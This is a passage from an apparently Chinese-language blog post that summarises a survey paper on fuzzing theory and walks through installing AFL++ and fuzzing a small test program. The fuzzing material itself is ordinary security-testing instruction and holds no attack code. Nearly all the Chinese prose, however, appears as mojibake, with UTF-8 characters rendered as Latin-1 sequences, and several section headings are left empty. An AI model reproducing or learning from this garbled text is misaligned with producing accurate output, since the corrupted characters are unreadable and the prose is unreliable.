indicator</li></ul><p>ä¸šç•Œåœ¨ç¼©å°è¿™äº›ç¼ºé™·ä¸Šåšå‡ºäº†è®¸å¤šåŠªåŠ›ã€‚åœ¨æœ¬ç¯‡è®ºæ–‡ä¸­ï¼Œç ”ç©¶è€…ç³»ç»ŸåŒ–åœ°å›é¡¾ä¸åˆ†æäº† fuzzing çš„ç¼ºé™·ä¸è§£å†³æ–¹æ¡ˆï¼ŒåŒæ—¶è€ƒè™‘äº†å¹¿åº¦ä¸æ·±åº¦</p><p>æœ¬ç¯‡è®ºæ–‡ç›®å½•å¦‚ä¸‹ï¼š</p><ul><li><strong>Â§2</strong>ï¼šoverview of fuzzing</li><li><strong>Â§3</strong>ï¼šdepicts fuzzing processes and various fuzzing theories to formulate he processes</li><li><strong>Â§4</strong>ï¼šanalyzes diverse solutions to reduce the search space of inputs</li><li><strong>Â§5</strong>ï¼šanalyzes how to automatize the execution of various PUTs and the detection of different bugs.</li><li><strong>Â§6</strong>ï¼šother some directions for future research</li></ul><h3 id="æ¨¡ç³Šæµ‹è¯•æ¦‚è¿°"><a href="#æ¨¡ç³Šæµ‹è¯•æ¦‚è¿°" class="headerlink" title="æ¨¡ç³Šæµ‹è¯•æ¦‚è¿°"></a>æ¨¡ç³Šæµ‹è¯•æ¦‚è¿°</h3><p><img src="/assets/Pasted%20image%2020250621145419.png"></p><p>æˆ‘ä»¬é¦–å…ˆä»‹ç»ä¸€äº›æœ¯è¯­ï¼ˆÂ <strong>Terminologies.</strong>Â ï¼‰ï¼Œå¦‚ Fig2 æ‰€ç¤ºï¼š</p><ul><li><strong>seed</strong>ï¼šè¢«ä¿ç•™çš„èƒ½å®Œæˆæ›´å¥½çš„ fitness çš„è¾“å…¥ï¼ˆä¾‹å¦‚æä¾›æ–°çš„è¦†ç›–ç‡ï¼‰</li><li><strong>fitness</strong>ï¼šå¯¹ä¸€ä¸ª input&#x2F;seed çš„è´¨é‡çš„æµ‹é‡</li><li><strong>power schedule</strong>ï¼šå†³å®šäº†åˆ†é…ç»™ seeds çš„ energy</li><li><strong>energy</strong>ï¼šåˆ†é…ç»™å½“å‰ fuzzing round çš„å˜å¼‚æ•°é‡</li><li><strong>fuzzer</strong>ï¼šfuzzing ç®—æ³•çš„å®ç°</li></ul><p>å¦‚ Fig2 æ‰€ç¤ºï¼Œfuzzing ç”±ä¸‰éƒ¨åˆ†ç»„æˆï¼š</p><ul><li><strong>input generator</strong>ï¼šè´Ÿè´£å‘ executor æä¾›è¾“å…¥</li><li><strong>executor</strong>ï¼šè´Ÿè´£æ‰§è¡Œè¾“å…¥</li><li><strong>defect monitor</strong>ï¼šè´Ÿè´£æ£€æŸ¥æ˜¯å¦å‘ç°äº†æ–°çš„æ‰§è¡ŒçŠ¶æ€æˆ–ç¼ºé™·ï¼ˆä¾‹å¦‚ crashesï¼‰</li></ul><p>åŸºäºè¾“å…¥çš„ç”Ÿæˆæ–¹å¼ï¼Œfuzzing å¯ä»¥åˆ†ä¸ºï¼š</p><ul><li><strong>åŸºäºç”Ÿæˆçš„</strong>Â ï¼ˆgeneration-basedï¼‰ï¼šåŸºäºÂ <em>æ–‡æ³•</em>Â ï¼ˆgrammarsï¼‰æˆ–Â <em>æœ‰æ•ˆè¯­æ–™åº“</em>Â ï¼ˆvalid corpusï¼‰ä»å¤´å¼€å§‹ç”Ÿæˆï¼›å¦‚ Fig2 æ‰€ç¤ºï¼Œå…¶ä»ä¸€ç»„ç§å­ä¸­ç›´æ¥è·å¾—è¾“å…¥</li><li><strong>åŸºäºå˜å¼‚çš„</strong>ï¼ˆmutation-basedï¼‰ï¼šå¯¹ç°æœ‰çš„ç§å­è¿›è¡ŒÂ <em>å˜å¼‚</em>Â ï¼ˆmutateï¼‰ä»¥è·å¾—æ–°çš„è¾“å…¥ï¼›å¯¹ç»™å®šçš„ä¸€ç»„ç§å­ï¼ŒåŸºäºå˜å¼‚çš„æ¨¡ç³Šæµ‹è¯•é€šè¿‡ seed scheduleã€byte scheduleã€mutation schedule ä»¥è·å¾—è¾“å…¥</li></ul><blockquote><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œfuzzing å¹¶ä¸éœ€è¦ç»å† Fig2 ä¸­çš„æ‰€æœ‰æ­¥éª¤ï¼Œä¾‹å¦‚åŸºäºç”Ÿæˆçš„æ¨¡ç³Šæµ‹è¯•å¹¶ä¸æ‰§è¡Œ byte schedule æˆ– mutation scheduleï¼Œä½†å…³æ³¨äºä»åˆå§‹è¾“å…¥æ–‡ä»¶ä¸­é€‰æ‹©æœ€ä¼˜çš„ç§å­ç»„</p></blockquote><p>åŸºäºæ‰§è¡Œæ—¶è§‚æµ‹åˆ°çš„ä¿¡æ¯é‡ï¼Œfuzzing å¯ä»¥åˆ†ä¸ºï¼š</p><ul><li><strong>é»‘ç›’</strong>ï¼ˆblackboxï¼‰ï¼šé»‘ç›’æ¨¡ç³Šæµ‹è¯•å¹¶ä¸çŸ¥é“æ¯æ¬¡æ‰§è¡Œçš„å†…éƒ¨çŠ¶æ€ï¼Œé€šè¿‡ä½¿ç”¨è¾“å…¥æ ¼å¼åŒ–æˆ–ä¸åŒçš„è¾“å‡ºçŠ¶æ€æ¥è¿›è¡Œä¼˜åŒ–</li><li><strong>ç™½ç›’</strong>ï¼ˆwhiteboxï¼‰ï¼šç™½ç›’æ¨¡ç³Šæµ‹è¯•å¯¹æ¯æ¬¡æ‰§è¡Œçš„å†…éƒ¨çŠ¶æ€æ˜¯å…¨éƒ¨å¾—çŸ¥çš„ï¼Œè¿™ä½¿å…¶èƒ½ç³»ç»ŸåŒ–åœ°æ¢ç´¢ç›®æ ‡ç¨‹åºçš„çŠ¶æ€ç©ºé—´ï¼›å…¶é€šå¸¸ä½¿ç”¨ concolic executionï¼ˆä¾‹å¦‚Â <em>dynamic symbolic executionï¼Œå³åŠ¨æ€ç¬¦å·æ‰§è¡Œ</em>Â ï¼‰æ¥åˆ†æç›®æ ‡ç¨‹åº</li><li><strong>ç°ç›’</strong>ï¼ˆgreyboxï¼‰ï¼šç°ç›’æ¨¡ç³Šæµ‹è¯•è·å¾—çš„æ‰§è¡ŒçŠ¶æ€ä¿¡æ¯åœ¨é»‘ç›’ä¸ç™½ç›’ä¹‹é—´ï¼Œä¾‹å¦‚è®¸å¤š fuzzer éƒ½ä½¿ç”¨Â <em>è¾¹ç•Œè¦†ç›–ç‡</em>Â ï¼ˆedge coverageï¼‰ä½œä¸ºå†…éƒ¨æ‰§è¡ŒçŠ¶æ€</li></ul><p>æœ€é€šç”¨çš„æ‰§è¡ŒçŠ¶æ€ä¾¿æ˜¯ä»£ç è¦†ç›–ç‡ï¼ˆcode coverageï¼Œä¾‹å¦‚ CFGsï¼ˆcontrol flow graphsï¼‰ ä¸­çš„åŸºæœ¬å—ï¼ˆbasic blockã€è¾¹ï¼ˆedgesï¼‰ï¼‰ï¼Œè¦†ç›–ç‡çš„åŸºæœ¬å‡è®¾ç”¨æ³•æ˜¯ï¼šå‘ç°æ›´å¤šçš„æ‰§è¡ŒçŠ¶æ€ï¼ˆä¾‹å¦‚æ–°çš„è¦†ç›–ç‡ï¼‰èƒ½æé«˜å‘ç°æ¼æ´çš„æ¦‚ç‡ã€‚å› æ­¤Â <em>è¦†ç›–ç‡æŒ‡å¯¼</em>Â ï¼ˆcoverage-guidedï¼‰çš„æ¨¡ç³Šæµ‹è¯•çš„ç›®æ ‡ä¾¿æ˜¯è¦†ç›–æ›´å¤šçš„ä»£ç ã€‚</p><blockquote><p>ä½†æ‰§è¡ŒçŠ¶æ€å¹¶ä¸é™åˆ¶äºä»£ç è¦†ç›–ç‡ï¼Œå¯¹é¢å‘å¯¹è±¡ç¨‹åºï¼ˆobject-oriented programsï¼‰è€Œè¨€ä¹Ÿå¯ä»¥æ˜¯æ‰§è¡Œçš„åˆæ³•æ€§ï¼ˆlegalityï¼‰ï¼Œå¯¹åè®®å®ç°ï¼ˆprotocol implementationsï¼‰å¯ä»¥æ˜¯çŠ¶æ€æœºï¼ˆstate machineï¼‰ï¼Œå¯¹å¹¶å‘å®ç°ï¼ˆconcurrencyï¼‰å¯ä»¥æ˜¯ alias coverageï¼Œå¯¹æ·±åº¦å­¦ä¹ æ¨¡å‹ï¼ˆdeep learning modelsï¼‰å¯ä»¥æ˜¯ç¥ç»è¦†ç›–ç‡ï¼ˆneuron coverageï¼‰ï¼Œå¯¹å®‰å“æ™ºèƒ½ç”µè§†åˆ™å¯ä»¥æ˜¯æ‰§è¡Œæ—¥å¿—ï¼ˆexecution logsï¼‰</p></blockquote><p>Fuzzer é€šå¸¸ä½¿ç”¨Â <em>å´©æºƒ</em>Â ï¼ˆcrashesï¼‰ä½œä¸ºå®‰å…¨æ¼æ´çš„æŒ‡ç¤ºå™¨ï¼Œå› ä¸º crashes æä¾›äº†ç›´æ¥çš„è‡ªåŠ¨è®°å½•ï¼ˆOS ä¼šè‡ªåŠ¨å‘å‡ºä¿¡å·å‘ŠçŸ¥ç¨‹åºå´©æºƒï¼‰ï¼Œç„¶è€Œæœ‰çš„ç¼ºé™·å¹¶ä¸ä¼šæ˜¾ç¤ºå‡º crashesï¼Œå› æ­¤ fuzzer ä½¿ç”¨å…¶ä»–çš„æŒ‡ç¤ºå™¨ï¼Œä¾‹å¦‚ physical safety violation</p><p>ä½† indicators ä»…æ˜¾ç¤ºäº†å¯èƒ½çš„å®‰å…¨é—®é¢˜ï¼Œè¿˜éœ€è¦å®‰å…¨å·¥å…·æˆ–äººå·¥ç¡®è®¤è¿™æ˜¯ä¸€ä¸ªÂ <em>æ¼æ´</em>Â ï¼ˆvulnerabilityï¼‰</p><h3 id="FUZZING-THEORY"><a href="#FUZZING-THEORY" class="headerlink" title="FUZZING THEORY"></a>FUZZING THEORY</h3><p>ä¸ºäº†æé«˜å‘ç°æ¼æ´çš„æ¦‚ç‡ï¼Œfuzzer åœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­ä½¿ç”¨åé¦ˆï¼ˆfeedbackï¼‰æœºåˆ¶ï¼Œä¾‹å¦‚ä»¥æ‰§è¡ŒçŠ¶æ€æˆ–ç»“æœä½œä¸º fitnesï¼Œä¸€ä¸ªå…¸å‹çš„ fitness ä¾¿æ˜¯åŸºäºä»£ç è¦†ç›–ç‡ï¼ˆä¾‹å¦‚åŸºæœ¬å—æˆ–è¾¹ï¼‰è¿›è¡Œè¾“å…¥ç”Ÿæˆï¼Œä½†ä»…æœ‰ä»£ç è¦†ç›–ç‡<strong>å¹¶éä¸€ç›´éƒ½æ˜¯å¯é çš„</strong>ï¼Œå°±ç®—å¯é ä¹Ÿå¯èƒ½æ”¶ç›Šä¸é«˜ï¼ˆä¾‹å¦‚æŒ‡æ•°å‹æ•°é‡çš„è¾“å…¥ç”Ÿæˆå¯èƒ½åªå¸¦æ¥çº¿æ€§çš„æ¼æ´å‘ç°ï¼‰ï¼Œå› æ­¤ä¸€ç§å¸¸è§çš„æ”¹è¿›æ–¹æ³•æ˜¯ä¼˜åŒ–æ¨¡ç³Šæµ‹è¯•çš„è¿‡ç¨‹æˆ–æ˜¯ä¸º fitness ä¸°å¯Œä¿¡æ¯ï¼ŒTable 1 å±•ç¤ºäº†ä¸åŒçš„ fuzzer çš„ä¼˜åŒ–æ–¹æ³•ï¼š</p><p><img src="/assets/Pasted%20image%2020250621145854.png"></p><h4 id="Seed-Set-Selection"><a href="#Seed-Set-Selection" class="headerlink" title="Seed Set Selection"></a>Seed Set Selection</h4><p>å¯¹ç§å­é›†çš„ä¼˜åŒ–å…³æ³¨äº<strong>æœ€å°åŒ–ç§å­é›†çš„å¤§å°</strong>ï¼Œä¾‹å¦‚é€‰æ‹©èƒ½è¦†ç›–æ‰€æœ‰å·²å‘ç°ä»£ç è¦†ç›–çš„ä¸€ç»„æœ€å°‘çš„ç§å­ï¼Œå› ä¸ºè¿‡äºå¯Œé›†çš„ç§å­ä¼šåœ¨æ£€éªŒå·²æ¢æµ‹ä»£ç åŒºåŸŸä¸Šæµªè´¹è®¡ç®—èµ„æº</p><blockquote><p>åœ¨Â <a href="https://www.usenix.org/conference/usenixsecurity14/technical-sessions/presentation/rebert">UESIX çš„ä¸€ç¯‡è®ºæ–‡</a>Â ä¸­å…¶è¢«è¡¨è¿°ä¸ºÂ <em>æœ€å°è¦†ç›–é›†é—®é¢˜</em>Â ï¼ˆminimal set coverage problemï¼ŒMSCPï¼‰</p></blockquote><h4 id="Seed-Schedule"><a href="#Seed-Schedule" class="headerlink" title="Seed Schedule"></a>Seed Schedule</h4><p><strong>ç§å­è°ƒåº¦</strong>ï¼ˆseed scheduleï¼‰æœŸæœ›è§£å†³å¦‚ä¸‹é—®é¢˜ï¼š</p><ul><li>åœ¨ä¸‹ä¸€è½®ä¸­é€‰æ‹©å“ªä¸ªç§å­</li><li>ä¸ºè¯¥ç§å­åˆ†é…çš„æ—¶é—´é¢„ç®—ï¼ˆtime budgetï¼‰ï¼›å¤§éƒ¨åˆ† fuzzer å®é™…ä¸Šé€‰æ‹©ä¼˜åŒ–å¯¹è¢«é€‰å–ç§å­çš„å˜å¼‚æ¬¡æ•°</li></ul><p>ç”±äº PUTs ä¸æ¼æ´çš„å¤æ‚æ€§ï¼Œæœªå‘ç°ä»£ç è¦†ç›–ç‡ä¸æœªå‘ç°æ¼æ´æ˜¯ä¸å¯çŸ¥çš„ï¼Œæˆ‘ä»¬æ— æ³•çŸ¥é“ä¸€ä¸ªè¾“å…¥æ˜¯å¦èƒ½è§¦å‘æ¼æ´ï¼Œç±»ä¼¼åœ°åœ¨æ£€ç´¢ä»£ç ä¹‹å‰æˆ‘ä»¬ä¹Ÿä¸èƒ½è·å¾—ç¨‹åºè¡Œä¸ºçš„æ¦‚ç‡åˆ†å¸ƒï¼Œå› æ­¤æ•°å­¦ä¸Šæˆ‘ä»¬å‡ ä¹ä¸å¯èƒ½æ‰¾åˆ°ä¸€ä¸ªå…¨é¢çš„ä¼˜åŒ–è§£æ³•ï¼Œå› æ­¤ç ”ç©¶äººå‘˜åŸºäºå¤šç§ä¼˜åŒ–æ–¹æ³•æ¥è¿‘ä¼¼åœ°è§£å†³è¿™ä¸ªé—®é¢˜</p><h4 id="Fitness-by-Bugs"><a href="#Fitness-by-Bugs" class="headerlink" title="Fitness by Bugs"></a>Fitness by Bugs</h4><p>é€šå¸¸è€Œè¨€åœ¨æ¨¡ç³Šæµ‹è¯•è¿‡ç¨‹ä¸­ä½¿ç”¨ä¸¤ç§ fitness è¿›è¡Œä¼˜åŒ–ï¼š1ï¼‰åŸºäºæ¼æ´ 2ï¼‰åŸºäºæ‰§è¡ŒçŠ¶æ€ï¼ˆä¾‹å¦‚ä»£ç è¦†ç›–ç‡ï¼‰</p><p>ç”±äº fuzzing çš„ç›®çš„æ˜¯å‘ç°æ¼æ´ï¼Œå‘ç°æ¼æ´çš„æ•°é‡ä¾¿æ˜¯ä¸€ç§æœ€ç®€å•çš„ fitnessï¼Œä¸€ç§æ–¹æ³•ä¾¿æ˜¯åœ¨éšæœº&#x2F;é¡ºåºé€‰æ‹©ç§å­çš„æ—¶å€™è°ƒåº¦æ¯ä¸ªç§å­çš„æ—¶é—´é¢„ç®—ï¼Œåœ¨ä¸è€ƒè™‘æ‰§è¡ŒçŠ¶æ€çš„æƒ…å†µä¸‹ï¼ŒÂ <em>æœ€å¤§åŒ–æ¼æ´æ•°é‡é—®é¢˜</em>Â å¯ä»¥è¢«ç®€åŒ–ä¸ºä¸€ä¸ªÂ <strong>æ•´æ•°çº¿æ€§è§„åˆ’</strong>ï¼ˆInteger Linear Programmingï¼ŒILPï¼‰é—®é¢˜ï¼Œå³åœ¨çº¿æ€§çº¦æŸä¸‹æœ€å¤§åŒ–æ¼æ´æ•°é‡â€”â€”ä»¥è§£å†³è¿™æ ·çš„ ILP é—®é¢˜æ¥è‡ªåŠ¨è®¡ç®—æ¯ä¸ªç§å­çš„æ—¶é—´é¢„ç®—</p><p>å¦å¤–ä¸€ç§è®¤çŸ¥æ˜¯å°†æ¼æ´å‘ç°çš„è¿‡ç¨‹è§†ä½œÂ <strong>å¸¦æƒå¥–åˆ¸æ”¶é›†é—®é¢˜</strong>ï¼ˆWeighted Coupon Collectorâ€™s Problemï¼Œ<del>ä¸æ‡‚çš„å»ºè®®ç¿»æ¦‚ç‡è®ºè¯¾æœ¬è™½ç„¶ğŸ‘´çš„æ¦‚ç‡è®ºä¹Ÿæ˜¯æŒ‚å¾—ä¸€å¡Œç³Šæ¶‚</del>ï¼‰ï¼šfuzzing ä¸­å‘ç°çš„æ¯ä¸ªç‹¬ç‰¹çš„æ¼æ´éƒ½è¢«è§†ä½œä¸€ç§â€œå¥–åˆ¸â€ï¼ŒWCCP æœŸæœ›ä»¥æ­¤é¢„æµ‹å‘ç°ä¸‹ä¸ªâ€œå¥–åˆ¸â€æ‰€éœ€è¦çš„å°è¯•çš„æ•°é‡ï¼ˆæ—¶é—´é¢„ç®—ï¼‰</p><p>ILP ä¸ WCCP éƒ½æ˜¯ä¸ºäº†å°†æ›´å¤šçš„æ—¶é—´äºæ˜¯åˆ†é…ç»™æ›´æœ‰æ½œåŠ›çš„ç§å­ä»¥å‘ç°æ›´å¤šæ¼æ´</p><h3 id="SEARCH-SPACE-OF-INPUT"><a href="#SEARCH-SPACE-OF-INPUT" class="headerlink" title="SEARCH SPACE OF INPUT"></a>SEARCH SPACE OF INPUT</h3><h3 id="AUTOMATION"><a href="#AUTOMATION" class="headerlink" title="AUTOMATION"></a>AUTOMATION</h3><h3 id="DIRCTIONS-OF-PUTU"><a href="#DIRCTIONS-OF-PUTU" class="headerlink" title="DIRCTIONS OF PUTU"></a>DIRCTIONS OF PUTU</h3><h2 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h2><p>å®‰è£… AFL++</p><ul><li>dockeré•œåƒ</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">æ‹‰å–AFL++é•œåƒ</span><br>docker pull aflplusplus/aflplusplus<br><span class="hljs-meta prompt_"># </span><span class="language-bash">è¿è¡Œå®¹å™¨</span><br>docker run --name afl -it -d aflplusplus/aflplusplus /bin/bash<br><span class="hljs-meta prompt_"># </span><span class="language-bash">è¿æ¥å®¹å™¨</span><br>docker exec -it afl /bin/bash<br></code></pre></td></tr></table></figure><ul><li>ç¼–è¯‘å®‰è£…</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">git clone https://github.com/AFLplusplus/AFLplusplus.git<br>cd AFLplusplus<br>make<br>make install<br></code></pre></td></tr></table></figure><ul><li>é¢„ç¼–è¯‘åŒ…å®‰è£…</li></ul><p>Ubuntu ä¸‹å¯ä»¥é€šè¿‡ apt åŒ…ç®¡ç†å®‰è£…ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">apt install afl++<br></code></pre></td></tr></table></figure><ul><li>ä¸‹è½½ Fuzzing101</li></ul><p>åœ¨ aflplusplus docker å®¹å™¨ä¸­æ­å»ºé¡¹ç›®ç¯å¢ƒ</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">cd /root/<br>git clone https://github.com/antonio-morales/Fuzzing101<br></code></pre></td></tr></table></figure><h2 id="åŸºæœ¬ç”¨æ³•"><a href="#åŸºæœ¬ç”¨æ³•" class="headerlink" title="åŸºæœ¬ç”¨æ³•"></a>åŸºæœ¬ç”¨æ³•</h2><p>é€šè¿‡ Fuzzing101 çš„ç¬¬ä¸€ä¸ªç»ƒä¹ æ¥å­¦ä¹ å¦‚ä½•ä½¿ç”¨ AFL++ è¿›è¡Œ fuzzï¼Œä»¥åŠå¦‚ä½•é€šè¿‡ gdb æ¥åˆ†æå´©æºƒã€‚</p><p>æˆ‘ä»¬ AFL é¡¹ç›®ä¸­çš„ä¾‹å­<code>test-instr.c</code>æ¥å­¦ä¹  AFL++ çš„åŸºç¡€ä½¿ç”¨ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span>** argv)</span> &#123;<br><br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">8</span>];<br><br>  <span class="hljs-keyword">if</span> (read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">8</span>) &lt; <span class="hljs-number">1</span>) &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Hum?\n&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>  &#125;<br><br>  <span class="hljs-keyword">if</span> (buf[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;0&#x27;</span>)<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Looks like a zero to me!\n&quot;</span>);<br>  <span class="hljs-keyword">else</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;A non-zero value? How quaint!\n&quot;</span>);<br><br>  <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br><br>&#125;<br></code></pre></td></tr></table></figure><p>é¦–å…ˆé€šè¿‡</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">afl-gcc <span class="hljs-keyword">test</span>.c -o <span class="hljs-keyword">test</span><br></code></pre></td></tr></table></figure><p>é€šè¿‡<code>afl-gcc</code>ç¼–è¯‘åçš„æ–‡ä»¶ä¼šåœ¨<code>test</code>ç¨‹åºä¸­è¿›è¡Œæ’æ¡©ã€‚</p><p>ä¹‹åæˆ‘ä»¬éœ€è¦åˆ›å»º<code>in</code>ç›®å½•å’Œ<code>out</code>ç›®å½•ä½œä¸ºè¾“å…¥è¾“å‡ºç›®å½•ã€‚</p><p>å¹¶ä¸”æˆ‘ä»¬éœ€è¦åœ¨<code>in</code>ç›®å½•ä¸­åˆ›å»ºæ–‡ä»¶ä½œä¸ºåŸºç¡€è¯­æ–™æ ·æœ¬ï¼Œaflä¼šè‡ªåŠ¨æ ¹æ®æ ·æœ¬å˜å¼‚ã€‚</p><p>å¦‚ï¼š</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">aaaaaaaaaaaaaaaaaa</span><br></code></pre></td></tr></table></figure><p>ä¹‹åæˆ‘ä»¬ä¾¿å¯ä»¥æ‰§è¡Œä»¥ä¸‹å‘½ä»¤å¼€å§‹ fuzzã€‚</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">afl-fuzz -i <span class="hljs-keyword">in</span> -o <span class="hljs-keyword">out</span> <span class="hljs-comment">-- ./test   </span><br></code></pre></td></tr></table></figure><h3 id="AFLçŠ¶æ€çª—å£"><a href="#AFLçŠ¶æ€çª—å£" class="headerlink" title="AFLçŠ¶æ€çª—å£"></a>AFLçŠ¶æ€çª—å£</h3><p><img src="/Linux/assets/Pasted%20image%2020250312230349.png"></p><p>ä¸ºäº†å¸®åŠ©æ‚¨å†³å®šä½•æ—¶æŒ‰Ctrl-Cåœæ­¢ï¼Œå¾ªç¯è®¡æ•°å™¨ä¼šè¿›è¡Œé¢œè‰²ç¼–ç ã€‚åœ¨ç¬¬ä¸€æ¬¡å¾ªç¯æ—¶ï¼Œè®¡æ•°å™¨æ˜¾ç¤ºä¸ºå“çº¢è‰²ï¼Œå¦‚æœåç»­å¾ªç¯ä»ç„¶æœ‰æ–°å‘ç°ï¼Œå®ƒä¼šå˜ä¸ºé»„è‰²ï¼Œç„¶åå˜æˆè“è‰²ï¼Œæœ€ç»ˆå½“æ¨¡ç³Šå™¨ä¸€æ®µæ—¶é—´æ²¡æœ‰çœ‹åˆ°æ–°å‘ç°æ—¶ï¼Œä¼šå˜æˆç»¿è‰²ã€‚</p><p>AFL çš„ç»ˆç«¯ UI ä½¿ç”¨ä¸åŒé¢œè‰²æ¥å¿«é€Ÿæç¤ºè¿è¡ŒçŠ¶æ€ï¼š</p><table><thead><tr><th>é¢œè‰²</th><th>å«ä¹‰è¯´æ˜</th></tr></thead><tbody><tr><td>ğŸŸ¢ <strong>ç»¿è‰²</strong></td><td>çŠ¶æ€æ­£å¸¸ï¼Œå¦‚ç¨³å®šã€æ­£åœ¨å¤„ç†ã€fuzzing æ­£å¸¸è¿›è¡Œ</td></tr><tr><td>ğŸ”´ <strong>çº¢è‰²</strong></td><td><strong>ä¸¥é‡é—®é¢˜</strong>ï¼Œå¯èƒ½é˜»ç¢æ¨¡ç³Šæµ‹è¯•æ•ˆæœ</td></tr><tr><td>ğŸŸ£ <strong>ç´«è‰²</strong></td><td><strong>è­¦å‘ŠçŠ¶æ€</strong>ï¼Œå¯èƒ½ä»£è¡¨æ€§èƒ½ä½ä¸‹ã€è¦†ç›–ç‡å·®æˆ–å¾…è°ƒä¼˜</td></tr><tr><td>ğŸŸ¡ <strong>é»„è‰²</strong></td><td>æ¬¡è¦è­¦å‘Šï¼Œä¾‹å¦‚è¯­æ–™åº“å¾…ä¼˜åŒ–ã€åˆå§‹é˜¶æ®µæ…¢ç­‰</td></tr><tr><td>âšª <strong>ç™½è‰²&#x2F;ç°è‰²</strong></td><td>é™æ€ä¿¡æ¯æˆ–æ™®é€šæ–‡æœ¬</td></tr></tbody></table><ul><li>Process timing:Fuzzerè¿è¡Œæ—¶é•¿ã€ä»¥åŠè·ç¦»æœ€è¿‘å‘ç°çš„è·¯å¾„ã€å´©æºƒå’ŒæŒ‚èµ·ç»è¿‡äº†å¤šé•¿æ—¶é—´ã€‚</li><li>Overall resultsï¼šFuzzerå½“å‰çŠ¶æ€çš„æ¦‚è¿°ã€‚</li><li>Cycle progressï¼šæˆ‘ä»¬è¾“å…¥é˜Ÿåˆ—çš„è·ç¦»ã€‚</li><li>Map coverageï¼šç›®æ ‡äºŒè¿›åˆ¶æ–‡ä»¶ä¸­çš„æ’æ¡©ä»£ç æ‰€è§‚å¯Ÿåˆ°è¦†ç›–èŒƒå›´çš„ç»†èŠ‚ã€‚</li><li>Stage progressï¼šFuzzerç°åœ¨æ­£åœ¨æ‰§è¡Œçš„æ–‡ä»¶å˜å¼‚ç­–ç•¥ã€æ‰§è¡Œæ¬¡æ•°å’Œæ‰§è¡Œé€Ÿåº¦ã€‚</li><li>Findings in depthï¼šæœ‰å…³æˆ‘ä»¬æ‰¾åˆ°çš„æ‰§è¡Œè·¯å¾„ï¼Œå¼‚å¸¸å’ŒæŒ‚èµ·æ•°é‡çš„ä¿¡æ¯ã€‚</li><li>Fuzzing strategy yieldsï¼šå…³äºçªå˜ç­–ç•¥äº§ç”Ÿçš„æœ€æ–°è¡Œä¸ºå’Œç»“æœçš„è¯¦ç»†ä¿¡æ¯ã€‚</li><li>Path geometryï¼šæœ‰å…³Fuzzeræ‰¾åˆ°çš„æ‰§è¡Œè·¯å¾„çš„ä¿¡æ¯ã€‚</li><li>CPU loadï¼šCPUåˆ©ç”¨ç‡</li></ul><p>è¯­æ–™åº“</p><p>AFL éœ€è¦ä¸€äº›åˆå§‹è¾“å…¥æ•°æ®ï¼ˆä¹Ÿå«ç§å­æ–‡ä»¶ï¼‰ä½œä¸º Fuzzing çš„èµ·ç‚¹ï¼Œè¿™äº›è¾“å…¥ç”šè‡³å¯ä»¥æ˜¯æ¯«æ— æ„ä¹‰çš„æ•°æ®ï¼ŒAFLå¯ä»¥é€šè¿‡å¯å‘å¼ç®—æ³•è‡ªåŠ¨ç¡®å®šæ–‡ä»¶æ ¼å¼ç»“æ„ã€‚</p><p>ç§å­çš„é€‰æ‹©ï¼š</p><ul><li>æœ‰æ•ˆçš„è¾“å…¥<ul><li>ç›®æ 